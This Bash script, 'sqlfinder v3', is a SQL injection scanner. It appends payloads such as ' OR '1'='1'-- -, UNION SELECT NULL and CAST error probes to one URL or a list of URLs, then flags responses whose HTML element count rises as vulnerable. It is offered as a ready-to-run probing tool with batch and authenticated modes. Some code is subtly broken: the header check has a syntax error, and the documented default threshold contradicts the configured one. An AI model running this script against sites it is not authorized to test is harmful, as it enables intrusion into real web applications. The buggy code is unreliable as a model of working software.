#!/bin/bash
# sqlfinder v3
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

WARNING="⚠️"
CHECK="✓"


# Configuration
THRESHOLD_PERCENT=10  # Minimum percentage increase to flag as SQLi
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
TIMEOUT=10
COOKIE_FILE="/tmp/sqli_cookies.txt"




#Clean up function
cleanup() {
    
    rm -f /tmp/original_response.txt /tmp/sqli_response.txt "$COOKIE_FILE" 2>/dev/null
}

# Setup trap for cleanup
trap cleanup EXIT


# Usage and help
show_help() {
    echo "SQL Injection Detector - Element Count Analysis"
    echo "Usage: $0 [OPTIONS] <URL>"
    echo
    echo "Options:"
    echo "  -u, --url <URL>          Test single URL"
    echo "  -f, --file <FILE>        Test multiple URLs from file"
    echo "  -p, --payload <PAYLOAD>  Custom SQL payload (default: ' OR '1'='1'-- -)"
    echo "  -t, --threshold <NUM>    Percentage threshold (default: 30)"
    echo "  -h, --help               Show this help"
    echo "  -v, --verbose            Show verbose output"
    echo "   -H <header>             Add custom HTTP header"
    echo
    echo "Examples:"
    echo "  $0 -u \"https://example.com/page?id=1\""
    echo "  $0 -f urls.txt"
    echo "  $0 -u \"https://example.com/search\" -p \"' UNION SELECT NULL--\""
    echo
    echo "Payload examples:"
    echo "  Basic: ' OR '1'='1'-- -"
    echo "  Union: ' UNION SELECT NULL,NULL-- -"
    echo "  Error: ' AND 1=CAST('test' AS INT)--"
}



# Curl wrapper with common options
curl_cmd() {
    local url="$1"
    curl -s -L \
        --max-time "$TIMEOUT" \
        ${header:+-H "$header"}\
        --user-agent "$USER_AGENT" \
        --cookie "$COOKIE_FILE" \
        --cookie-jar "$COOKIE_FILE" \
        -w "\n%{http_code}" \
        "$url" 2>/dev/null
}

# Extract HTTP body from curl response (removes status code)
extract_body() {
    # Remove the last line (status code) added by curl -w
    head -n -1
}

# Count HTML elements in response
count_elements() {
    local response="$1"
    echo "$response" | grep -o '<[^>]*>' | wc -l
}

# Extract page title for identification
get_page_title() {
    local response="$1"
    echo "$response" | grep -o '<title>[^<]*</title>' | sed 's/<title>\(.*\)<\/title>/\1/' | head -1
}


# Helper to check specific pattern changes
check_pattern_changes() {
    local original_body="$1"
    local sql_body="$2"
    
    # Common patterns to check
    patterns=(
        "product" "item" "row" "record" "entry"
        "<div>" "<tr>" "<li>" "<img " "href="
    )
    
    echo "Element Count Analysis:"
    for pattern in "${patterns[@]}"; do
        orig_count=$(echo "$original_body" | grep -c "$pattern")
        sql_count=$(echo "$sql_body" | grep -c "$pattern")
        
        if [ "$orig_count" -ne "$sql_count" ]; then
            change=$(( sql_count - orig_count ))
            echo -e "      $pattern: ${orig_count} → ${sql_count} (+${change})"
        fi
    done
    
    # Check for SQL error messages
    if echo "$sql_body" | grep -qi "sql.*error\|syntax.*error\|mysql\|postgresql\|oracle"; then
        echo "    [!] SQL error message detected in response"
    fi
}

# Batch testing function
test_multiple_urls() {
    local urls_file="$1"
    
    if [ ! -f "$urls_file" ]; then
        echo "Error: File $urls_file not found"
        return 1
    fi
    
    vulnerable_urls=()
    suspicious_urls=()
    
    echo "=== Testing multiple URLs from $urls_file ==="
    echo
    
    while IFS= read -r url || [ -n "$url" ]; do
        # Skip empty lines and comments
        [[ -z "$url" ]] && continue
        [[ "$url" =~ ^# ]] && continue
        
        echo "--------------------------------------------------"
        
        if detect_sqli "$url"; then
            vulnerable_urls+=("$url")
        elif [ $? -eq 2 ]; then
            suspicious_urls+=("$url")
        fi
        
        echo
        sleep 1  # Rate limiting
    done < "$urls_file"
    
    # Print summary
    echo "=================================================="
    echo "TEST SUMMARY:"
    echo "  Vulnerable URLs: ${#vulnerable_urls[@]}"
    echo "  Suspicious URLs: ${#suspicious_urls[@]}"
    echo
    
    if [ ${#vulnerable_urls[@]} -gt 0 ]; then
        echo "VULNERABLE URLS:"
        for url in "${vulnerable_urls[@]}"; do
            echo "  - $url"
        done
        echo
    fi
    
    if [ ${#suspicious_urls[@]} -gt 0 ]; then
        echo "SUSPICIOUS URLS (needs manual check):"
        for url in "${suspicious_urls[@]}"; do
            echo "  - $url"
        done
    fi
}

# Main SQLi detection function
detect_sqli() {
    local url="$1"
    local payload="${2:-"' OR '1'='1'-- -"}"
    
    #echo -e "${YELLOW}--->${NC}Testing: $url "
    #echo "Using payload: $payload"
    #echo
    
    # Make original request
    #echo "[*] Making original request..."
    original_response=$(curl_cmd "$url")
    original_status=$(echo "$original_response" | tail -1)
    original_body=$(echo "$original_response" | extract_body)
    
    #if [[ ! "$original_status" =~ ^2[0-9][0-9]$ ]] && [[ ! "$original_status" =~ ^3[0-9][0-9]$ ]]; then
        #echo "[-] Original request failed with status: $original_status"
        #return 1
    #fi
    
    echo "$original_body" > /tmp/original_response.txt
    
    # Make SQLi request
    #echo "[*] Making SQL injection test request..."
    
    # Encode payload for URL
    encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'\''/%27/g; s/"/%22/g; s/#/%23/g')
    
    # Construct test URL (handle query parameters properly)
    if [[ "$url" == *"?"* ]]; then
        # URL already has parameters
        if [[ "$url" == *"="* ]]; then
            # Append to last parameter value
            test_url="${url}${encoded_payload}"
        else
            # Add as first parameter
            test_url="${url}${encoded_payload}"
        fi
    else
        # No parameters yet
        test_url="${url}?test${encoded_payload}"
    fi
    
    sql_response=$(curl_cmd "$test_url")
    sql_status=$(echo "$sql_response" | tail -1)
    sql_body=$(echo "$sql_response" | extract_body)
    
    #if [[ ! "$sql_status" =~ ^2[0-9][0-9]$ ]] && [[ ! "$sql_status" =~ ^3[0-9][0-9]$ ]]; then
    #    echo "[-] SQL test request failed with status: $sql_status"
        #return 1
    #fi
    
    echo "$sql_body" > /tmp/sqli_response.txt
    
    # Count elements
    original_count=$(count_elements "$original_body")
    sql_count=$(count_elements "$sql_body")
    
    # Calculate percentage increase
    if [ "$original_count" -eq 0 ]; then
    #    echo "[-] Cannot calculate ratio (original count is 0)"
        return 1
    fi
    
    increase_pct=$(( (sql_count - original_count) * 100 / original_count ))
    #echo "  Increase: ${increase_pct}%"
    
    # Get page titles for comparison
    original_title=$(get_page_title "$original_body")
    sql_title=$(get_page_title "$sql_body")
    
if [[ "$original_title" != "$sql_title" ]]; then
    echo -e "${RED}⚠️ Title changed!${NC}"
    echo "Original: $original_title"
    echo "SQL test: $sql_title"
fi
    
    echo
    
    # Detection logic
    if [ "$sql_count" -gt "$original_count" ]; then
        if [ $increase_pct -ge $THRESHOLD_PERCENT ]; then
            echo -e "${RED}[VULNERABLE] ⚠️ POSSIBLE SQL INJECTION VULNERABILITY DETECTED!${NC}"
            echo -e "    URL: ${YELLOW}$url${NC}"
            echo -e "    Payload: ${YELLOW}$payload${NC}"
            echo -e "    Reason: ${BLUE}Elements on page increased$ ${increase_pct}% (${original_count} → ${sql_count})${NC}"
            echo ""
            
            # Try to identify what changed (product count, etc.)
            echo "    Element Count Analysis:"
            echo "       Original: $original_count HTML elements"
            echo "       SQL test: $sql_count HTML elements"
    
            
            # Check for common patterns
            check_pattern_changes "$original_body" "$sql_body"
            
            return 0  # Vulnerability detected
        else
            echo "[-] Minor element count change (${increase_pct}%)"
            return 1  # Not vulnerable
        fi
    elif [ "$sql_count" -lt "$original_count" ]; then
        decrease_pct=$(( (original_count - sql_count) * 100 / original_count ))
        echo "[-] Element count decreased by ${decrease_pct}%"
        echo "    (Could be error-based SQLi or application error)"
        return 1
    else
        #echo "[-] No change in element count"
        return 1
    fi
}


# Main execution
main() {
    # Parse arguments
    local url=""
    local urls_file=""
    local payload="' OR '1'='1'-- -"
    
while getopts ":u:f:H:p:t:vh" opt; do
  case "$opt" in
    u) url="$OPTARG" ;;
    f) urls_file="$OPTARG" ;;
    H) header="$OPTARG" ;;
    p) payload="$OPTARG" ;;
    t) THRESHOLD_PERCENT="$OPTARG" ;;
    v) verbose=true ;;
    h)
      show_help
      exit 0
      ;;
    :)
      echo "Error: Option -$OPTARG requires an argument"
      exit 1
      ;;
    \?)
      echo "Invalid option: -$OPTARG"
      show_help
      exit 1
      ;;
  esac
done

# Shift processed options away
shift $((OPTIND - 1))

# Handle any remaining arguments as URL if -u was not used
if [ -z "$url" ] && [ $# -gt 0 ]; then
    url="$1"
fi

if [[ -n $header]]; then
echo "Running Authenticated Comparisson"
fi

    # Run appropriate test
    if [ -n "$urls_file" ]; then
        test_multiple_urls "$urls_file"
    elif [ -n "$url" ]; then
        detect_sqli "$url" "$payload"
    else
        show_help
        exit 1
    fi
}

# Run main if script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
